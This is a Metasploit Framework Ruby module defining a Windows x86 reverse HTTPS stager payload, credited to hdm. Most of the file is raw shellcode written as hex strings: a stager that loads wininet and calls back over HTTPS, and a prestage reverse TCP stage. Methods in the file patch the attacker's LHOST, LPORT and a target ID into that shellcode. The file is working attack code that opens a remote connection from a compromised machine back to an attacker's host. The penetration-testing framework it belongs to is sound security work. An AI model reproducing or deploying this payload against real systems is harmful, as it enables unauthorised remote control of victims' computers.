##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_https'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse HTTPS Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Tunnel communication over HTTP using SSL',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseHttps,
			'Convention'    => 'sockedi https',
			'Stager'        =>
				{
					'Offsets' =>
						{
							 'EXITFUNC' => [ 297, 'V' ],
							 'LPORT'    => [ 192, 'v' ], # Not a typo, really little endian
						},
					'Payload' =>
"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
"\x68\x6E\x65\x74\x00\x68\x77\x69\x6E\x69\x89\xE6\x54\x68\x4C\x77" +
"\x26\x07\xFF\xD5\x31\xFF\x57\x57\x57\x57\x56\x68\x3A\x56\x79\xA7" +
"\xFF\xD5\x89\xC6\xEB\x64\x5B\x31\xC9\x51\x51\x6A\x03\x51\x51\x68" +
"\x5C\x11\x00\x00\x53\x56\x68\x57\x89\x9F\xC6\xFF\xD5\xEB\x4D\x59" +
"\x31\xD2\x52\x68\x00\x32\xE0\x84\x52\x52\x52\x51\x52\x50\x68\xEB" +
"\x55\x2E\x3B\xFF\xD5\x89\xC6\x31\xDB\x53\x53\x53\x53\x56\x68\x2D" +
"\x06\x18\x7B\xFF\xD5\x85\xC0\x75\x36\x68\xAA\xC5\xE2\x5D\xFF\xD5" +
"\x3C\x0D\x75\x24\x68\x80\x33\x00\x00\x89\xE0\x6A\x04\x50\x6A\x1F" +
"\x56\x68\x75\x46\x9E\x86\xFF\xD5\xEB\xCD\xEB\x45\xE8\xAE\xFF\xFF" +
"\xFF\x2F\x31\x32\x33\x34\x35\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A" +
"\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68\x58\xA4\x53" +
"\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x53\x53\x56\x68\x12\x96\x89" +
"\xE2\xFF\xD5\x85\xC0\x74\xD1\x8B\x07\x01\xC3\x85\xC0\x75\xE9\x58" +
"\xC3\xE8\x50\xFF\xFF\xFF"

				}
			))
	end

	#
	# Do not transmit the stage over the connection.  We handle this via HTTPS
	#
	def stage_over_connection?
		false
	end

	def generate
		p = super

		i = p.index("/12345\x00")
		u = "/A" + datastore['TARGETID'].to_s + "\x00"
		raise ArgumentError, "TARGETID can be 4 bytes long at the most" if u.length > 7

		p[i, u.length] = u
		p + datastore['LHOST'].to_s + "\x00"
	end

	def prestage_payload
		stage =
			# Name: stager_reverse_tcp_dns_connect_only
			# Length: 315 bytes
			# Port Offset: 215
			# HostName Offset: 251
			# RetryCounter Offset: 209
			# ExitFunk Offset: 240
			"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
			"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
			"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
			"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
			"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
			"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
			"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
			"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
			"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
			"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
			"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
			"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
			"\xD5\x97\xEB\x32\x68\xA9\x28\x34\x80\xFF\xD5\x8B\x40\x0C\x8B\x40" +
			"\x08\x6A\x05\x50\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68" +
			"\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x51\xFF\x4E\x08\x75\xEC\x68" +
			"\xF0\xB5\xA2\x56\xFF\xD5\xE8\xC9\xFF\xFF\xFF\x58\x58\x58\x58\x58" +
			"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
			"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
			"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
			"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00"

		stage[215, 2]  = [datastore['LPORT'].to_i].pack("n")

		i = stage.index("X" * 63)
		u = datastore['LHOST'].to_s + "\x00"
		raise ArgumentError, "LHOST can be 63 bytes long at the most" if u.length > 64
		stage[i, u.length] = u
		stage
	end

end

